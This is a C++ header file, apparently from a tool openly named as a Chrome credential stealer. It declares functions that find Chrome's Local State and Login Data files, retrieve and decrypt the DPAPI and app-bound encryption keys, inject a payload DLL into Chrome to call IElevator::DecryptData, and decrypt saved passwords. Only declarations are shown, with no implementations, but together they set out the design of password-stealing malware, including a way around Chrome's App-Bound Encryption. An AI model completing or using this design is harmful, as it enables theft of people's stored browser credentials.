#pragma once

#ifdef _WIN32

#include <Windows.h>
#include <Shlobj.h>
#include <string>
#include <nlohmann/json.hpp>
#include <locale>
#include <codecvt>
#include <sqlite3.h>
#include <sodium/core.h>
#include <sodium/crypto_aead_aes256gcm.h>
#include <vector>
#include <fstream>
#include <wincrypt.h>
#include <bcrypt.h>

// Link against the required libraries
#pragma comment(lib, "Crypt32.lib")
#pragma comment(lib, "Shell32.lib")
#pragma comment(lib, "Advapi32.lib")
#pragma comment(lib, "Bcrypt.lib")


//using namespace std;
using json = nlohmann::json;

#define MAX_LINE_LENGTH 1024
#define IV_SIZE 12

#define EXIT_FAILURE 1
#define EXIT_SUCCESS 0

// ANSI escape codes for colors
#define RESET   "\033[0m"
#define PURPLE  "\033[35m"
#define GREEN   "\033[32m"
#define YELLOW  "\033[33m"

#define okay(msg, ...) printf(GREEN "[+] " RESET msg "\n", ##__VA_ARGS__)
#define warn(msg, ...) printf(PURPLE "[-] " RESET msg "\n", ##__VA_ARGS__)
#define info(msg, ...) printf(YELLOW "[i] " RESET msg "\n", ##__VA_ARGS__)

//Checks if Chrome is installed in the local machine.
//@turn a bool stating if it is installed or not.
bool IsChromeInstalled();

// Finds the path to the Local State file.
// @return The path to the Local State file as a wide string.
std::wstring FindLocalState();

// Finds the path to the Login Data file.
// @return The path to the Login Data file as a wide string.
std::wstring FindLoginData();

// Retrieves the encrypted key from the Local State file (DPAPI / encrypted_key).
// @param localStatePath The path to the Local State file.
// @return The encrypted key as a string.
std::string getEncryptedKey(const std::wstring& localStatePath);

// Retrieves the app-bound encrypted key from Local State (APPB / app_bound_encrypted_key).
// Used when Chrome uses App-Bound Encryption (v20).
// @param localStatePath The path to the Local State file.
// @return The app_bound_encrypted_key string if present, empty otherwise.
std::string getAppBoundEncryptedKey(const std::wstring& localStatePath);

// Gets the full path to chrome.exe from registry.
// @return Path to chrome.exe or empty string.
std::wstring GetChromePath();

// Decrypts the app-bound key by injecting into Chrome and calling IElevator::DecryptData.
// Requires ChromeStealerPayload.dll next to the exe.
// @param localStatePath Path to Local State (used only for fallback message).
// @param outKey Output 32-byte key. cbData set to 32 on success.
// @return true if key was obtained.
bool DecryptKeyViaChromeInjection(const std::wstring& localStatePath, DATA_BLOB& outKey);

// Parses the Login Data file to extract login credentials.
// @param loginDataPath The path to the Login Data file.
// @param decryptionKey The key used to decrypt the login data.
// @return An integer indicating success (0) or failure (non-zero).
int loginDataParser(const std::wstring& loginDataPath, DATA_BLOB decryptionKey);

// Decrypts an encrypted key.
// @param encrypted_key The encrypted key as a string.
// @return The decrypted key as a DATA_BLOB structure.
DATA_BLOB decryptKey(const std::string& encrypted_key);

// Decrypts a password using the provided key and initialization vector (IV).
// @param ciphertext The encrypted password.
// @param ciphertext_len The length of the encrypted password.
// @param key The key used for decryption.
// @param key_len The length of the key (should be 32 bytes for AES-256).
// @param iv The initialization vector used for decryption (12 bytes).
// @param decrypted The buffer to store the decrypted password.
// @param decrypted_len Output parameter for the length of decrypted data.
// @return True if decryption succeeded, false otherwise.
bool decryptPassword(unsigned char* ciphertext, size_t ciphertext_len, unsigned char* key, size_t key_len, unsigned char* iv, unsigned char* decrypted, size_t* decrypted_len);


#endif // _WIN32
